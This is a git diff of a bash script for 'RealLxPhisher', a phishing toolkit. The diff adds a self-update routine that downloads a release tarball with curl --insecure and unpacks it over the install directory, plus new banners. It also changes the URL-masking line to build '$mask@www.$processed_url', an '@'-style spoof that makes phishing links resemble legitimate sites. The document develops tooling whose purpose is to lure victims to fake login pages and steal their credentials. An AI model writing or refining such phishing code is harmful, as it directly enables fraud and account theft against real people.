@@ -140,15 +140,47 @@ kill_pid() {
 	fi
 }
 
+# Check for a newer release
+check_update(){
+	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
+	relase_url='https://api.github.com/repos/LxaNce-Hacker/RealLxPhisher/releases/latest'
+	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
+	tarball_url="https://github.com/RealLxPhisher/archive/refs/tags/${new_version}.tar.gz"
+
+	if [[ $new_version != $__version__ ]]; then
+		echo -ne "${ORANGE}update found\n"${WHITE}
+		sleep 2
+		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
+		pushd "$HOME" > /dev/null 2>&1
+		curl --silent --insecure --fail --retry-connrefused \
+		--retry 3 --retry-delay 2 --location --output ".RealLxPhisher.tar.gz" "${tarball_url}"
+
+		if [[ -e ".RealLxPhisher.tar.gz" ]]; then
+			tar -xf .RealLxPhisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
+			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
+			rm -f .RealLxPhisher.tar.gz
+			popd > /dev/null 2>&1
+			{ sleep 3; clear; banner_small; }
+			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run RealLxPhisher again\n\n"${WHITE}
+			{ reset_color ; exit 1; }
+		else
+			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading."
+			{ reset_color; exit 1; }
+		fi
+	else
+		echo -ne "${GREEN}up to date\n${WHITE}" ; sleep .5
+	fi
+}
 
 ## Banner
 banner() {
 	cat <<- EOF
-		${GREEN}
-		${GREEN} 	+-+-+-+-+-+-+ +-+-+-+-+-+-+-+
-		${GREEN} 	|L|x|a|N|c|e| |P|h|i|s|h|e|r|
-		${GREEN} 	+-+-+-+-+-+-+ +-+-+-+-+-+-+-+
-		${RED}                                Version : 2.2
+		${GREEN} 	▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+		${GREEN}	██░▄▄▀█░▄▄█░▄▄▀█░███░████░█░██░▄▄░█░█████▄██░▄▄█░████░▄▄█░▄▄▀
+		${GREEN}	██░▀▀▄█░▄▄█░▀▀░█░███░████▀▄▀██░▀▀░█░▄▄░██░▄█▄▄▀█░▄▄░█░▄▄█░▀▀▄
+		${GREEN}	██░██░█▄▄▄█▄██▄█▄▄██░▀▀░█▄█▄██░████▄██▄█▄▄▄█▄▄▄█▄██▄█▄▄▄█▄█▄▄
+		${GREEN}	▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
+		${RED}                                				Version : 2.2
 
 		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by LxaNce(Prince Katiyar)${WHITE}
 	EOF
@@ -166,6 +198,45 @@ banner_small() {
 	EOF
 }
 
+## About_Banner
+about_banner() {
+	cat <<- EOF
+		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⡿⢟⣿⠛⢉⣿⣤⣤⣿⣷⣶⣾⣷⣼⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣡⣾⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠛⢙⢛⣛⠻⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⡿⢛⣝⣖⠀⠀⠀⡐⢸⡟⢹⡿⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⠷⣿⣀⡹⠂⠀⠀⠀⠘⠛⠉⠁⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⠀⢀⠁⠀⠀⠀⠀⠀⠀⠀⠀  ⠈⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠤⠴⠒⠁⠀⢀⣼⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⡿⢿⣿⣟⣉⣦⣀⡀⠀⠀⠀⠀⠀⣠⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡟⠁⠀⠈⢿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣿⢿⣯⣍⡿⢷⡦⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠢⡀⠀⠸⡇⠉⢻⣿⣿⣿⣿⣯⣭⣀⣸⣿⣿⣧⡀⠈⢄⠈⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⢠⡏⠀⠀⠀⠀⠀⠈⠢⠀⢳⠀⠀⠙⢿⣿⠫⠙⠛⠛⠛⣿⡿⠿⣇⠀⠸⠆⢈⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠈⡣⢀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠙⠅⠀⠀⢀⣾⣿⠁⢀⡎⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠈⠐⠠⡀⡀⠀⠀⠀⠂⡄⠀⠀⢈⠶⣤⣤⣭⣥⣤⣾⡇⠑⢴⠆⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀⠀⠀⠀⠀⠀⠀⡁⠒⢄⣀⠀⠀⢐⠤⠁⠀⠡⡏⢫⡫⣺⣻⡇⠀⢨⢄⡘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠁⡠⠊⠀⠀⠀⠀⠀⡇⢀⠀⢸⣷⣦⡉⠀⠀⠀⠀⠈⢇⡻⢎⡫⠇⠀⡆⢨⣧⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		${GREEN}⠀⠀⠀⠀⠀⠀⠀⡠⠊⠀⠀⠀⠀⠀⠀⠀⠁⠆⢠⣿⣿⣿⣿⣿⣶⣄⡀⠀⠈⢻⣟⣱⠀⠘⢰⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		${GREEN}⠀⠀⠀⠀⠀⠀⠰⠆⠀⠀⠀⠀⠀⠀⠀⠀⢐⠂⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⢹⣿⠀⣠⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡌⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		${GREEN}⠀⠀⠀⠀⠀⠀⢰⡆⠀⠀⠀⠀⠀⠙⠀⡸⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		${GREEN}⠀⠀⠀⠀⠀⠀⠄⠡⡀⠠⢄⡀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		${GREEN}⠀⠀⠀⠀⠀⠀⡄⠀⠈⠂⠠⡈⠳⡄⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		${GREEN}⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠈⠐⠨⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		${GREEN}⠀⠀⠀⠀⠀⠀⡆⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠌⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		${GREEN}⠀⠀⠀⠀⠀⠀⢡⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⡠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		${GREEN}⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠲⠀⢺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+		${GREEN}
+	EOF
+}
 ## Dependencies
 dependencies() {
 	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."
@@ -218,7 +289,7 @@ dependencies() {
 check_status() {
 	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
 	timeout 3s curl -fIs "https://api.github.com" > /dev/null
-	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" || echo -e "${RED}Offline${WHITE}\n	${GREEN}YOU HAVE NO INETERNET CONNECTION, TRY AGAIN..."
+	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}\n	${GREEN}YOU HAVE NO INETERNET CONNECTION, TRY AGAIN..."
 }
 
 ## Download Ngrok
@@ -306,7 +377,7 @@ msg_exit() {
 
 ## About
 about() {
-	{ clear; banner; echo; }
+	{ clear; about_banner; banner; echo; }
 	cat <<- EOF
 		${GREEN}Author   ${RED}:  ${ORANGE}Prince Katiyar ${RED}[ ${ORANGE}LxaNce-Hacker ${RED}]
 		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/LxaNce-Hacker
@@ -407,7 +478,7 @@ custom_url() {
 		fi
 
 		url="https://$url"
-		masked_url="$mask@$processed_url"
+		masked_url="$mask@www.$processed_url"
 		processed_url="https://$processed_url"
 	else
 		# echo "[!] No url provided / Regex Not Matched"
@@ -908,7 +979,7 @@ main_menu() {
 ## Main
 kill_pid
 dependencies
-check_status
+# check_status
 install_ngrok
 install_cloudflared
 main_menu
